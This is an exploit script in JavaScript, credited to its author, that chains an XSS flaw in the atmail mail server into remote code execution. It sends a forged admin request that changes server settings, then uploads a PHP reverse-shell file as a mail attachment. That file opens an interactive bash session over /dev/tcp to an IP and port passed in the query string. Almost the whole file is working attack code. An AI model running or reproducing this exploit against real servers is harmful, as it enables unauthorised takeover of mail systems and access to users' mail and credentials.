// Author Youssef B.
// Trigger the xss to an RCE
// Vulnerability found in atmail mail server

var target = document.location.host;

function pwnSettingtmpFolderBaseName()
{
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://" + target + "/index.php/admin/settings/globalsave", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlenconded");
    xhttp.send("save=1&fields[sql_user]=root&fields[tmpFolderBaseName]=");
}

function uploadAllTheThings()
{
    // embed the reverse shell
    var phpKode = "<?php $ip=$_GET['ip']; $port=$_GET['port']; $string = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>1&'\"; exec($string); ?>";
    var fileSize = phpKode.length;
    var boundary = "--------------------------------270883142628617";
    var uri = "http://" + target + "/index.php/mail/composemessage/addattachment/composeID/";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-type", "multipart/form-data; boundary="+boundary);
    xhr.withCredentials = "true";
    var body = "";
    body += "--" + boundary + "\r\n";
    body += 'Content-Disposition: form-data; name="newAttachment"; filename="taipan.php"\r\n';
    body += "Content-type:   \r\n\r\n";
    body += phpKode + "\r\n";
    body += "--" + boundary + "--";
    xhr.send(body);
    return true;
}

pwnSettingtmpFolderBaseName();
setTimeout(uploadAllTheThings,1000);
